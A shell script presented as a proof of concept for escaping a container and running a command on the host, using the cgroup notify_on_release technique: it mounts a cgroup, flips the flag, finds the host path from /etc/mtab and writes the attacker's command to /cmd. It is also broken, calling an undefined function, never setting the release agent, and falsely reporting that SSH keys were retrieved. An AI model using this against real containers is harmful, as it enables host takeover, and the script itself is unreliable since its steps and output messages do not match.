#!/bin/sh

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


mount_files='/tmp/cgrp'

echo -e "${yellowColour}[*]${endColour}${grayColour} Executing PoC for host command execution from container...\n${endColour}"
sleep 0.5

var="$1"

function mount_files(){
        echo -e "${redColour}[*]${endcolour}${grayColour} Mounting directories\n${endColour}"
        if [[ ! -d "$mount_files" ]]; then
                (mkdir "$mount_files" && mount -t cgroup -o memory cgroup "$mount_files" && mkdir "$mount_files/x") 2>/dev/null
                echo -e "\t${greenColour}[+]${endcolour}${grayColour} Directories created and mounted\n\n${endColour}"
        else
                echo -e "${redColour}[!]${endColour}${grayColour} Directories already existed\n${endColour}"
        fi
}

function change_flag(){

        echo -e "${greenColour}[*]${endColour}${grayColour} Changing notify_on_release value\n${endColour}"
        echo 1 > "$mount_files/x/notify_on_release"
        if [[ $? -eq 0 ]]; then
                echo -e "${greenColour}[+]${endColour}${grayColour} Notify on release value changed\n\n${endColour}"
        else
                echo -e "${redColour}[!]${endColour}${grayColour} Notify on release value wasn't changed\n${endColour}"
                cat "$mount_files/x/notify_on_release"
                echo -e "${redColour}[*]${endColour}${grayColour} Exiting script...\n${endColour}"
                exit 0
        fi
}

function prepare_paths()
{
        echo -e "${redColour}[!]${endColour}${grayColour} Preparing path for RCE...\n${endColour}"
        sleep 2
        host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
        echo -e "\t${greenColour}[+]${endColour}${grayColour} Path loaded\n${endColour}"
        echo -e "\t${greenColour}[Path]${endColour}${grayColour} $host_path\n${endColour}"

        echo -e "${redColour}[!]${endColour}${grayColour} Preparing release agent path for RCE...\n${endColour}"
        echo '#!/bin/sh' > /cmd

        sleep 2
        echo -e "${redColour}[!]${endColour}${grayColour} Executing command: ${redColour}$var${endColour}${grayColour}in remote host from container...\n${endColour}"
        echo "$var > $host_path/output" >> /cmd
        sleep 3
}

function shut_down_processes(){

        chmod a+x /cmd
        sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
        echo -e "\t${greenColour}[+]${endColour}${grayColour} SSH Auth keys retrieved and saved in /output file.\n${endColour}"
        sleep 2
}

mount_files
change_flag
prepare_paths
save_rce_commands
shut_down_processes


echo -e "\n${redColour}[!]${endColour}${grayColour} Ending Script ... ${redColour}[!]${endColour}"
